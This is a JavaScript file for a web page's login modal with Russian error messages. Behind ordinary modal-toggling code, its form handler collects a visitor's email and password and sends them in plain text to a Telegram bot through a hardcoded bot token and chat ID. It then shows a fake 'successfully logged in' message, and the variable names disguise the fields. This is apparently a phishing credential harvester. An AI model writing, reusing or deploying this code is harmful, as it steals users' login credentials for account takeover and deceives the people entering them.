const open = document.querySelector(".open");
const modalBackdrop = document.querySelector(".modal-backdrop");
const modal = document.querySelector(".modal");
const close = document.querySelector(".close");

const apply = document.querySelector(".apply");
const inputGroup = document.querySelector(".modal-content");
const modalGreeting = document.querySelector(".modal-greeting");

let timeout;


const removeModalClasses = () => {
  modal.classList.remove("show-modal");
  modalBackdrop.classList.remove("show-modal-backdrop");
};

const checkContentClasses = () => {
  return (
    inputGroup.classList.contains("hide-content") &&
    modalGreeting.classList.contains("show-content")
  );
};

const removeContentClasses = () => {
  inputGroup.classList.remove("hide-content");
  modalGreeting.classList.remove("show-content");
};

const checkAndClearTimeout = () => {
  if (timeout) {
    clearTimeout(timeout);
    timeout = undefined;
  }
};

open.addEventListener("click", () => {
  modal.classList.add("show-modal");
  modalBackdrop.classList.add("show-modal-backdrop");
});

modalBackdrop.addEventListener("click", () => {
  removeModalClasses();

  if (checkContentClasses()) {
    removeContentClasses();
  }
  checkAndClearTimeout();
});

close.addEventListener("click", () => {
  removeModalClasses();
  if (checkContentClasses()) {
    removeContentClasses();
  }
  checkAndClearTimeout();
});

modal.addEventListener("click", (event) => {
  event.stopPropagation();
});

apply.addEventListener("click", () => {
  inputGroup.classList.add("hide-content");
  modalGreeting.classList.add("show-content");

  timeout = setTimeout(() => {
    removeModalClasses();
    removeContentClasses();
  }, 3000);
});



const form = document.querySelector("#form");
const message = document.querySelector(".first");
const tel = document.querySelector(".second");

const data = {
  Token: `bot7076762438:AAFihiObeul8LOXPUJ_SdkcWuxrvPnHAw5Y`,
  chatId: `-4129302196`,
};

form.addEventListener("submit", (event) => {
  event.preventDefault();
  const username = message.value.trim();
  const phone = tel.value.trim();
  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!username || !phone) {
    modalGreeting.textContent = `Ошибка: Пожалуйста, введите Почту и Пароль`;
    return
  } 
  if (!emailPattern.test(username)) {
    modalGreeting.textContent = `Ошибка: Пожалуйста, введите действительный email`;
    return
  }
  if (phone.length < 6) {
    modalGreeting.textContent = `Ошибка: Пожалуйста, введите пароль длиной не менее 6 символов`;
    return
  }
  const generate = `email: ${message.value}, password: ${tel.value}`;
  fetch(
    `https://api.telegram.org/${data.Token}/sendMessage?chat_id=${data.chatId}&text=${generate}`
  )
    .then((res) => res.json())
    .then((res) => {
      if (res.ok) {
        const modalText = document.createElement('h2')
        modalGreeting.append(modalText)
        (modalText.textContent = `Вы успешно вошли в аккаунт ${res.result.chat.title}`);
        return
      } else {
        throw new Error(res.description);
      }
    })
    .catch((error) => {
      return error.message;
    });
});
